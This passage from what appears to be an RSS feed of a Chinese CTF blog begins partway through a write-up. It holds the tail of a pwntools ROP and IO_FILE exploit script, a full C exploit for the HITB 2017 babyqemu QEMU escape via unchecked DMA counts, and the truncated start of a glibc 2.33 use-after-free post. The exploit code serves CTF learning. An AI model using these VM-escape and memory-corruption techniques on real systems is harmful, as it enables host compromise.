<span id="cb26-103"><a href="#cb26-103" aria-hidden="true"></a>pop_rdi <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x000000000002a3e5</span></span>
<span id="cb26-104"><a href="#cb26-104" aria-hidden="true"></a>pop_rsi <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x000000000002be51</span></span>
<span id="cb26-105"><a href="#cb26-105" aria-hidden="true"></a>pop_rdx_rbx <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000090529</span></span>
<span id="cb26-106"><a href="#cb26-106" aria-hidden="true"></a>_IO_wfile_jumps <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x2160c0</span></span>
<span id="cb26-107"><a href="#cb26-107" aria-hidden="true"></a>heap <span class="op">=</span> libc_base<span class="op">-</span><span class="bn">0xf3ff0</span></span>
<span id="cb26-108"><a href="#cb26-108" aria-hidden="true"></a>stderr <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x21a6a0</span></span>
<span id="cb26-109"><a href="#cb26-109" aria-hidden="true"></a></span>
<span id="cb26-110"><a href="#cb26-110" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x28</span>,p64(<span class="bn">0xffffffffffffffff</span>))</span>
<span id="cb26-111"><a href="#cb26-111" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x40</span>,p64(<span class="dv">1</span>))</span>
<span id="cb26-112"><a href="#cb26-112" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x50</span>,p64(heap)<span class="op">+</span>p64(setcontext))<span class="co"># rdx</span></span>
<span id="cb26-113"><a href="#cb26-113" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xa0</span>,p64(stderr<span class="op">+</span><span class="bn">0x30</span>))</span>
<span id="cb26-114"><a href="#cb26-114" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xd8</span>,p64(_IO_wfile_jumps<span class="op">+</span><span class="bn">0x30</span>))</span>
<span id="cb26-115"><a href="#cb26-115" aria-hidden="true"></a>write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xd8</span><span class="op">+</span><span class="bn">0x38</span>,p64(stderr<span class="op">+</span><span class="bn">0x40</span>))</span>
<span id="cb26-116"><a href="#cb26-116" aria-hidden="true"></a></span>
<span id="cb26-117"><a href="#cb26-117" aria-hidden="true"></a>rop <span class="op">=</span> p64(heap)<span class="op">+</span>p64(pop_rsi)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">2</span>)<span class="op">+</span>p64(syscall) <span class="co">#open</span></span>
<span id="cb26-118"><a href="#cb26-118" aria-hidden="true"></a>rop <span class="op">+=</span> p64(pop_rdi)<span class="op">+</span>p64(<span class="dv">3</span>)<span class="op">+</span>p64(pop_rsi)<span class="op">+</span>p64(heap<span class="op">+</span><span class="bn">0x400</span>)</span>
<span id="cb26-119"><a href="#cb26-119" aria-hidden="true"></a>rop <span class="op">+=</span> p64(pop_rdx_rbx)<span class="op">+</span>p64(<span class="bn">0x30</span>)<span class="op">*</span><span class="dv">2</span><span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(syscall) <span class="co">#read</span></span>
<span id="cb26-120"><a href="#cb26-120" aria-hidden="true"></a>rop <span class="op">+=</span> p64(pop_rdi)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(syscall)          <span class="co">#write</span></span>
<span id="cb26-121"><a href="#cb26-121" aria-hidden="true"></a></span>
<span id="cb26-122"><a href="#cb26-122" aria-hidden="true"></a></span>
<span id="cb26-123"><a href="#cb26-123" aria-hidden="true"></a>payload <span class="op">=</span> b<span class="st">&quot;flag&quot;</span>.ljust(<span class="bn">0xa0</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)<span class="op">+</span>p64(heap<span class="op">+</span><span class="bn">0x100</span>)<span class="op">+</span>p64(pop_rdi)</span>
<span id="cb26-124"><a href="#cb26-124" aria-hidden="true"></a>payload <span class="op">=</span> payload.ljust(<span class="bn">0x100</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)</span>
<span id="cb26-125"><a href="#cb26-125" aria-hidden="true"></a>payload <span class="op">+=</span> rop</span>
<span id="cb26-126"><a href="#cb26-126" aria-hidden="true"></a>write(<span class="dv">0</span>,payload)</span>
<span id="cb26-127"><a href="#cb26-127" aria-hidden="true"></a></span>
<span id="cb26-128"><a href="#cb26-128" aria-hidden="true"></a><span class="co"># debug(p,&quot;b *{}&quot;.format(setcontext))</span></span>
<span id="cb26-129"><a href="#cb26-129" aria-hidden="true"></a><span class="co"># pause()</span></span>
<span id="cb26-130"><a href="#cb26-130" aria-hidden="true"></a></span>
<span id="cb26-131"><a href="#cb26-131" aria-hidden="true"></a><span class="co"># =============[call _IO_flush_all]==============</span></span>
<span id="cb26-132"><a href="#cb26-132" aria-hidden="true"></a>write_nosuccess(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\xb8</span><span class="st">&quot;</span>)</span>
<span id="cb26-133"><a href="#cb26-133" aria-hidden="true"></a></span>
<span id="cb26-134"><a href="#cb26-134" aria-hidden="true"></a><span class="co"># debug(p)</span></span>
<span id="cb26-135"><a href="#cb26-135" aria-hidden="true"></a>p.interactive()</span></code></pre></div>
<h2 id="x03-总结">0x03 总结</h2>
<p>qwarmup只是相对简单的<code>dl_fixup</code>利用，虽然只有1字节写，但是从1字节写到无限字节写是一种常规的利用思路，同时，由于启用了<code>puts</code>等函数，打<code>IO_file</code>结构体泄露<code>libc</code>的真实地址使得这题难度再次下降。</p>
<p>但是这道题就引入了一种很好的思路，对延迟绑定的利用不一定非要局限于<code>ret2dl</code>的模板化利用，将视野放到整个延迟绑定的过程，它涉及多个结构体和各种指针，对其的劫持和利用是一类很好的思路。</p>
<p>当然，如果这题没有使用<code>puts</code>等函数，那该如何泄露<code>libc</code>？或者说，可不可以在不泄露libc的情况下执行ROP。</p>
<p>这里以国外比赛<code>writeup</code>为例，具体不在详述：</p>
<ul>
<li><strong>DiceCTF2022 nightmare</strong> ： <a href="https://blog.pepsipu.com/posts/nightmare">the pepsi place | Nightmare: Novel Exploitation Tactics With One Byte Write. (pepsipu.com)</a></li>
<li><strong>secconCTF2022 simplemod</strong>：<a href="https://org.anize.rs/SECCON-2022/pwn/simplemod.html">simplemod | Organisers (anize.rs)</a></li>
</ul>
<p>## 0xFF 参考连接</p>
<p><a href="https://docs.oracle.com/cd/E56344_01/html/E54069/chapter6-42444.html">动态节 - Oracle® Solaris 11.2 链接程序和库指南</a></p>
<p><a href="https://github.com/dicegang/dicectf-2022-challenges/tree/master/pwn/nightmare">dicectf-2022-challenges/pwn/nightmare at master · dicegang/dicectf-2022-challenges · GitHub</a></p>
<p><a href="https://gist.github.com/shift-crops/ff8c9f60660e2e7ab0e8c9f615c63176">SECCON CTF 2022 babyfile/simplemod (github.com)</a></p>
<p><a href="https://codebrowser.dev/glibc/glibc/elf/dl-runtime.c.html#_dl_fixup">dl-runtime.c source code - Codebrowser</a></p>
<p><a href="https://kagehutatsu.com/?p=723">2022 强网杯 Pwn 部分Writeup-Pwn影二つ的博客 (kagehutatsu.com)</a></p>
<p><a href="https://blog.csdn.net/conansonic/article/details/54634142">_dl_runtime_resolve源码分析_二侠的博客-CSDN博客</a></p>
<p><a href="https://ctf-wiki.org/executable/elf/structure/data-related-sections/">Data Related Sections - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://bbs.pediy.com/thread-258597.htm#msg_header_h1_2">深入窥探动态链接-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>]]></description>
    <pubDate>Wed, 23 Nov 2022 15:32:04 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[QEMU逃逸  --  dma]]></title>
    <link>https://blog.mark0519.com/#/pwnable/221113-qemu-dma</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/pwnable/221113-qemu-dma</guid>
    <description><![CDATA[<h1 id="qemu逃逸-dma">QEMU逃逸 – dma</h1>
<blockquote>
<p><code>DMA(Direct Memory Access)</code>：直接内存访问</p>
</blockquote>
<h2 id="x00-dma">0x00 DMA</h2>
<p><code>DMA(Direct Memory Access)</code>：直接内存访问</p>
<p>有两种方式引发数据传输：</p>
<p>第一种情况：软件对数据的请求</p>
<ul>
<li><p>当进程调用<code>read</code>，驱动程序函数分配一个<code>DMA</code>缓冲区，并让硬件将数据传输到这个缓冲区中，进程处于睡眠状态；</p></li>
<li><p>硬件将数据写入到<code>DMA</code>缓冲区中，当写入完毕，产生一个中断</p></li>
<li><p>中断处理程序获取输入的数据，应答中断，并唤起进程，该进程现在即可读取数据</p>
<p>第二种情况：在异步使用<code>DMA</code>时</p></li>
<li><p>硬件产生中断，宣告新数据的到来</p></li>
<li><p>中断处理程序分配一个缓冲区，并且告诉硬件向哪里传输数据</p></li>
<li><p>外围设备将数据写入数据区，完成后，产生另外一个中断</p></li>
<li><p>处理程序分发数据，唤醒任何相关进程，然后执行清理工作</p></li>
</ul>
<p>DMA控制器必须有以下功能：</p>
<p>1、 能向CPU发出系统保持(HOLD)信号，提出总线接管请求；</p>
<p>2、 当CPU发出允许接管信号后，负责对总线的控制，进入DMA方式；</p>
<p>3、 能对存储器寻址及能修改地址指针，实现对内存的读写操作；</p>
<p>4、 能决定本次DMA传送的字节数，判断DMA传送是否结束；</p>
<p>5、 发出DMA结束信号，使CPU恢复正常工作状态。</p>
<p><strong>注意：</strong>当虚拟机通过<code>DMA（Direct Memory Access）</code>访问大块<code>I/O</code>时，<code>QEMU</code>模拟程序将不会把结果放进共享页中，而是通过内存映射的方式将结果直接写到虚拟机的内存中，然后通知<code>KVM</code>模块告诉客户机<code>DMA</code>操作已经完成。</p>
<h2 id="x01-hitb-gsec2017-babyqemu">0x01 HITB GSEC2017 babyqemu</h2>
<p>DMA存在越界读和越界写</p>
<blockquote>
<p>本质上是完全没有检查dma.cnt的数字</p>
</blockquote>
<p>泄露qemu_elf_base，寻找system的plt表地址，填入“cat flag”字符串</p>
<h2 id="x02-exploit">0x02 exploit</h2>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;stdint.h&gt;</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;sys/mman.h&gt;</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;sys/io.h&gt;</span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a></span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true"></a><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true"></a><span class="dt">uint64_t</span> phy_userbuf;</span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true"></a><span class="dt">char</span> *userbuf;</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true"></a></span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true"></a><span class="dt">void</span> Err(<span class="dt">char</span> * err){</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true"></a>    printf(<span class="st">&quot;[*] Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>,err);</span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true"></a>    exit(-<span class="dv">1</span>);</span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true"></a>}</span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true"></a></span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true"></a><span class="dt">void</span> init_mmio(){</span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true"></a>    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_RDWR|O_SYNC);</span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true"></a>    mmio_mem = mmap(<span class="dv">0</span>,<span class="bn">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,<span class="dv">0</span>);</span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true"></a>}</span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true"></a></span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true"></a><span class="dt">void</span> mmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true"></a>    *(<span class="dt">uint32_t</span>*)(mmio_mem+addr) = value;</span>
<span id="cb1-24"><a href="#cb1-24" aria-hidden="true"></a>}</span>
<span id="cb1-25"><a href="#cb1-25" aria-hidden="true"></a></span>
<span id="cb1-26"><a href="#cb1-26" aria-hidden="true"></a><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</span>
<span id="cb1-27"><a href="#cb1-27" aria-hidden="true"></a>    <span class="cf">return</span> *(<span class="dt">uint64_t</span>*)(mmio_mem+addr); </span>
<span id="cb1-28"><a href="#cb1-28" aria-hidden="true"></a>}</span>
<span id="cb1-29"><a href="#cb1-29" aria-hidden="true"></a></span>
<span id="cb1-30"><a href="#cb1-30" aria-hidden="true"></a><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</span>
<span id="cb1-31"><a href="#cb1-31" aria-hidden="true"></a>    <span class="dt">uint64_t</span> data;</span>
<span id="cb1-32"><a href="#cb1-32" aria-hidden="true"></a></span>
<span id="cb1-33"><a href="#cb1-33" aria-hidden="true"></a>    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</span>
<span id="cb1-34"><a href="#cb1-34" aria-hidden="true"></a>    <span class="cf">if</span>(!fd){</span>
<span id="cb1-35"><a href="#cb1-35" aria-hidden="true"></a>        perror(<span class="st">&quot;open pagemap&quot;</span>);</span>
<span id="cb1-36"><a href="#cb1-36" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb1-37"><a href="#cb1-37" aria-hidden="true"></a>    }</span>
<span id="cb1-38"><a href="#cb1-38" aria-hidden="true"></a></span>
<span id="cb1-39"><a href="#cb1-39" aria-hidden="true"></a>    <span class="dt">size_t</span> pagesize = getpagesize();</span>
<span id="cb1-40"><a href="#cb1-40" aria-hidden="true"></a>    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</span>
<span id="cb1-41"><a href="#cb1-41" aria-hidden="true"></a></span>
<span id="cb1-42"><a href="#cb1-42" aria-hidden="true"></a>    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</span>
<span id="cb1-43"><a href="#cb1-43" aria-hidden="true"></a>        puts(<span class="st">&quot;lseek&quot;</span>);</span>
<span id="cb1-44"><a href="#cb1-44" aria-hidden="true"></a>        close(fd);</span>
<span id="cb1-45"><a href="#cb1-45" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb1-46"><a href="#cb1-46" aria-hidden="true"></a>    }</span>
<span id="cb1-47"><a href="#cb1-47" aria-hidden="true"></a></span>
<span id="cb1-48"><a href="#cb1-48" aria-hidden="true"></a>    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</span>
<span id="cb1-49"><a href="#cb1-49" aria-hidden="true"></a>        puts(<span class="st">&quot;read&quot;</span>);</span>
<span id="cb1-50"><a href="#cb1-50" aria-hidden="true"></a>        close(fd);</span>
<span id="cb1-51"><a href="#cb1-51" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb1-52"><a href="#cb1-52" aria-hidden="true"></a>    }</span>
<span id="cb1-53"><a href="#cb1-53" aria-hidden="true"></a></span>
<span id="cb1-54"><a href="#cb1-54" aria-hidden="true"></a>    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</span>
<span id="cb1-55"><a href="#cb1-55" aria-hidden="true"></a>        puts(<span class="st">&quot;page&quot;</span>);</span>
<span id="cb1-56"><a href="#cb1-56" aria-hidden="true"></a>        close(fd);</span>
<span id="cb1-57"><a href="#cb1-57" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb1-58"><a href="#cb1-58" aria-hidden="true"></a>    }</span>
<span id="cb1-59"><a href="#cb1-59" aria-hidden="true"></a></span>
<span id="cb1-60"><a href="#cb1-60" aria-hidden="true"></a>    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</span>
<span id="cb1-61"><a href="#cb1-61" aria-hidden="true"></a>    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</span>
<span id="cb1-62"><a href="#cb1-62" aria-hidden="true"></a></span>
<span id="cb1-63"><a href="#cb1-63" aria-hidden="true"></a>    close(fd);</span>
<span id="cb1-64"><a href="#cb1-64" aria-hidden="true"></a></span>
<span id="cb1-65"><a href="#cb1-65" aria-hidden="true"></a>    <span class="cf">return</span> phyaddr;</span>
<span id="cb1-66"><a href="#cb1-66" aria-hidden="true"></a>}</span>
<span id="cb1-67"><a href="#cb1-67" aria-hidden="true"></a></span>
<span id="cb1-68"><a href="#cb1-68" aria-hidden="true"></a><span class="dt">uint64_t</span> dma_get_src(){</span>
<span id="cb1-69"><a href="#cb1-69" aria-hidden="true"></a>    <span class="cf">return</span> mmio_read(<span class="bn">0x80</span>);</span>
<span id="cb1-70"><a href="#cb1-70" aria-hidden="true"></a>}</span>
<span id="cb1-71"><a href="#cb1-71" aria-hidden="true"></a></span>
<span id="cb1-72"><a href="#cb1-72" aria-hidden="true"></a><span class="dt">uint64_t</span> dma_get_dst(){</span>
<span id="cb1-73"><a href="#cb1-73" aria-hidden="true"></a>    <span class="cf">return</span> mmio_read(<span class="bn">0x88</span>);</span>
<span id="cb1-74"><a href="#cb1-74" aria-hidden="true"></a>}</span>
<span id="cb1-75"><a href="#cb1-75" aria-hidden="true"></a></span>
<span id="cb1-76"><a href="#cb1-76" aria-hidden="true"></a><span class="dt">uint64_t</span> dma_get_cnt(){</span>
<span id="cb1-77"><a href="#cb1-77" aria-hidden="true"></a>    <span class="cf">return</span> mmio_read(<span class="bn">0x90</span>);</span>
<span id="cb1-78"><a href="#cb1-78" aria-hidden="true"></a>}</span>
<span id="cb1-79"><a href="#cb1-79" aria-hidden="true"></a></span>
<span id="cb1-80"><a href="#cb1-80" aria-hidden="true"></a><span class="dt">uint64_t</span> dma_get_cmd(){</span>
<span id="cb1-81"><a href="#cb1-81" aria-hidden="true"></a>    <span class="cf">return</span> mmio_read(<span class="bn">0x98</span>);</span>
<span id="cb1-82"><a href="#cb1-82" aria-hidden="true"></a>}</span>
<span id="cb1-83"><a href="#cb1-83" aria-hidden="true"></a></span>
<span id="cb1-84"><a href="#cb1-84" aria-hidden="true"></a><span class="dt">void</span> dma_set_src(<span class="dt">uint32_t</span> value){</span>
<span id="cb1-85"><a href="#cb1-85" aria-hidden="true"></a>    mmio_write(<span class="bn">0x80</span>,value);</span>
<span id="cb1-86"><a href="#cb1-86" aria-hidden="true"></a>}</span>
<span id="cb1-87"><a href="#cb1-87" aria-hidden="true"></a></span>
<span id="cb1-88"><a href="#cb1-88" aria-hidden="true"></a><span class="dt">void</span> dma_set_dst(<span class="dt">uint32_t</span> value){</span>
<span id="cb1-89"><a href="#cb1-89" aria-hidden="true"></a>    mmio_write(<span class="bn">0x88</span>,value);</span>
<span id="cb1-90"><a href="#cb1-90" aria-hidden="true"></a>}</span>
<span id="cb1-91"><a href="#cb1-91" aria-hidden="true"></a></span>
<span id="cb1-92"><a href="#cb1-92" aria-hidden="true"></a><span class="dt">void</span> dma_set_cnt(<span class="dt">uint32_t</span> value){</span>
<span id="cb1-93"><a href="#cb1-93" aria-hidden="true"></a>    mmio_write(<span class="bn">0x90</span>,value);</span>
<span id="cb1-94"><a href="#cb1-94" aria-hidden="true"></a>}</span>
<span id="cb1-95"><a href="#cb1-95" aria-hidden="true"></a></span>
<span id="cb1-96"><a href="#cb1-96" aria-hidden="true"></a><span class="dt">void</span> dma_set_cmd(<span class="dt">uint32_t</span> value){ <span class="co">// timer</span></span>
<span id="cb1-97"><a href="#cb1-97" aria-hidden="true"></a>    mmio_write(<span class="bn">0x98</span>,value);</span>
<span id="cb1-98"><a href="#cb1-98" aria-hidden="true"></a>}</span>
<span id="cb1-99"><a href="#cb1-99" aria-hidden="true"></a></span>
<span id="cb1-100"><a href="#cb1-100" aria-hidden="true"></a><span class="dt">void</span> dma_do_write(<span class="dt">uint32_t</span> addr, <span class="dt">void</span>* buf, <span class="dt">size_t</span> len){</span>
<span id="cb1-101"><a href="#cb1-101" aria-hidden="true"></a>    memcpy(userbuf, buf, len);</span>
<span id="cb1-102"><a href="#cb1-102" aria-hidden="true"></a></span>
<span id="cb1-103"><a href="#cb1-103" aria-hidden="true"></a>    dma_set_src(phy_userbuf);</span>
<span id="cb1-104"><a href="#cb1-104" aria-hidden="true"></a>    dma_set_dst(addr);</span>
<span id="cb1-105"><a href="#cb1-105" aria-hidden="true"></a>    dma_set_cnt(len);</span>
<span id="cb1-106"><a href="#cb1-106" aria-hidden="true"></a></span>
<span id="cb1-107"><a href="#cb1-107" aria-hidden="true"></a>    dma_set_cmd(<span class="dv">1</span>);</span>
<span id="cb1-108"><a href="#cb1-108" aria-hidden="true"></a>    sleep(<span class="dv">1</span>);</span>
<span id="cb1-109"><a href="#cb1-109" aria-hidden="true"></a>}</span>
<span id="cb1-110"><a href="#cb1-110" aria-hidden="true"></a></span>
<span id="cb1-111"><a href="#cb1-111" aria-hidden="true"></a><span class="dt">void</span> dma_do_enc(<span class="dt">uint32_t</span> addr, <span class="dt">size_t</span> len){</span>
<span id="cb1-112"><a href="#cb1-112" aria-hidden="true"></a>    dma_set_src(addr);</span>
<span id="cb1-113"><a href="#cb1-113" aria-hidden="true"></a>    dma_set_cnt(len);</span>
<span id="cb1-114"><a href="#cb1-114" aria-hidden="true"></a></span>
<span id="cb1-115"><a href="#cb1-115" aria-hidden="true"></a>    dma_set_cmd(<span class="dv">7</span>);</span>
<span id="cb1-116"><a href="#cb1-116" aria-hidden="true"></a>}</span>
<span id="cb1-117"><a href="#cb1-117" aria-hidden="true"></a></span>
<span id="cb1-118"><a href="#cb1-118" aria-hidden="true"></a></span>
<span id="cb1-119"><a href="#cb1-119" aria-hidden="true"></a><span class="dt">int</span> main(){</span>
<span id="cb1-120"><a href="#cb1-120" aria-hidden="true"></a>    init_mmio();</span>
<span id="cb1-121"><a href="#cb1-121" aria-hidden="true"></a>    puts(<span class="st">&quot;[*] init mmio&quot;</span>);</span>
<span id="cb1-122"><a href="#cb1-122" aria-hidden="true"></a>    printf(<span class="st">&quot;[*] mmio_mem ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,mmio_mem);</span>
<span id="cb1-123"><a href="#cb1-123" aria-hidden="true"></a></span>
<span id="cb1-124"><a href="#cb1-124" aria-hidden="true"></a>    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</span>
<span id="cb1-125"><a href="#cb1-125" aria-hidden="true"></a>    memset(userbuf,<span class="dv">0</span>,<span class="bn">0x1000</span>);</span>
<span id="cb1-126"><a href="#cb1-126" aria-hidden="true"></a>    phy_userbuf = va2pa(userbuf);</span>
<span id="cb1-127"><a href="#cb1-127" aria-hidden="true"></a>    printf(<span class="st">&quot;[*] userbuf ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,userbuf);</span>
<span id="cb1-128"><a href="#cb1-128" aria-hidden="true"></a>    printf(<span class="st">&quot;[*] phy_userbuf ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,phy_userbuf);</span>
<span id="cb1-129"><a href="#cb1-129" aria-hidden="true"></a></span>
<span id="cb1-130"><a href="#cb1-130" aria-hidden="true"></a>    puts(<span class="st">&quot;[*] leak addr&quot;</span>);</span>
<span id="cb1-131"><a href="#cb1-131" aria-hidden="true"></a>    dma_set_src(<span class="bn">0x40000</span>+<span class="bn">0x1000</span>);</span>
<span id="cb1-132"><a href="#cb1-132" aria-hidden="true"></a>    dma_set_dst(phy_userbuf);</span>
<span id="cb1-133"><a href="#cb1-133" aria-hidden="true"></a>    dma_set_cnt(<span class="bn">0x8</span>);</span>
<span id="cb1-134"><a href="#cb1-134" aria-hidden="true"></a>    dma_set_cmd(<span class="bn">0x3</span>);</span>
<span id="cb1-135"><a href="#cb1-135" aria-hidden="true"></a>    sleep(<span class="dv">1</span>);</span>
<span id="cb1-136"><a href="#cb1-136" aria-hidden="true"></a></span>
<span id="cb1-137"><a href="#cb1-137" aria-hidden="true"></a>    <span class="dt">size_t</span> enc_addr = *(<span class="dt">size_t</span>*)userbuf;</span>
<span id="cb1-138"><a href="#cb1-138" aria-hidden="true"></a>    printf(<span class="st">&quot;[*] enc_addr ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,enc_addr);</span>
<span id="cb1-139"><a href="#cb1-139" aria-hidden="true"></a>    <span class="dt">size_t</span> qemu_base = enc_addr-<span class="bn">0x283dd0</span>;</span>
<span id="cb1-140"><a href="#cb1-140" aria-hidden="true"></a>    printf(<span class="st">&quot;[*] qemu_base ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,qemu_base);</span>
<span id="cb1-141"><a href="#cb1-141" aria-hidden="true"></a>    <span class="dt">size_t</span> system_plt = qemu_base+<span class="bn">0x1FDB18</span>;</span>
<span id="cb1-142"><a href="#cb1-142" aria-hidden="true"></a>    printf(<span class="st">&quot;[*] system_plt ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,system_plt);</span>
<span id="cb1-143"><a href="#cb1-143" aria-hidden="true"></a></span>
<span id="cb1-144"><a href="#cb1-144" aria-hidden="true"></a>    puts(<span class="st">&quot;[*] edit enc ==&gt; system@plt&quot;</span>);</span>
<span id="cb1-145"><a href="#cb1-145" aria-hidden="true"></a>    dma_do_write(<span class="bn">0x40000</span>+<span class="bn">0x1000</span>, &amp;system_plt, <span class="bn">0x8</span>);</span>
<span id="cb1-146"><a href="#cb1-146" aria-hidden="true"></a></span>
<span id="cb1-147"><a href="#cb1-147" aria-hidden="true"></a>    puts(<span class="st">&quot;[*] set &#39;cat flag&#39; &quot;</span>);</span>
<span id="cb1-148"><a href="#cb1-148" aria-hidden="true"></a>    <span class="dt">char</span>* catflag = <span class="st">&quot;cat ./flag</span><span class="sc">\x00\x00</span><span class="st">&quot;</span>;</span>
<span id="cb1-149"><a href="#cb1-149" aria-hidden="true"></a>    dma_do_write(<span class="bn">0x200</span>+<span class="bn">0x40000</span>, catflag, <span class="dv">12</span>);</span>
<span id="cb1-150"><a href="#cb1-150" aria-hidden="true"></a>    <span class="co">// pause();</span></span>
<span id="cb1-151"><a href="#cb1-151" aria-hidden="true"></a>    puts(<span class="st">&quot;[*] enc &#39;cat flag&#39; &quot;</span>);</span>
<span id="cb1-152"><a href="#cb1-152" aria-hidden="true"></a>    dma_do_enc(<span class="bn">0x200</span>+<span class="bn">0x40000</span>, <span class="dv">8</span>);</span>
<span id="cb1-153"><a href="#cb1-153" aria-hidden="true"></a></span>
<span id="cb1-154"><a href="#cb1-154" aria-hidden="true"></a>    <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb1-155"><a href="#cb1-155" aria-hidden="true"></a>}</span></code></pre></div>]]></description>
    <pubDate>Wed, 23 Nov 2022 15:32:04 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[ Glibc-2.33 UAF利用总结]]></title>
    <link>https://blog.mark0519.com/#/pwnable/220703-glibc-233UAF</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#/pwnable/220703-glibc-233UAF</guid>
    <description><![CDATA[<h1 id="glibc-2.33-uaf利用总结">Glibc-2.33 UAF利用总结</h1>
<blockquote>
<p>最近老是能遇到2.33的题。。。</p>
</blockquote>
<h2 id="x00-无限制uaf">0x00 无限制UAF</h2>
<p>没有限制的UAF没啥好说的，泄露libc和key，tcache打任意一个hook实现利用</p>
<blockquote>
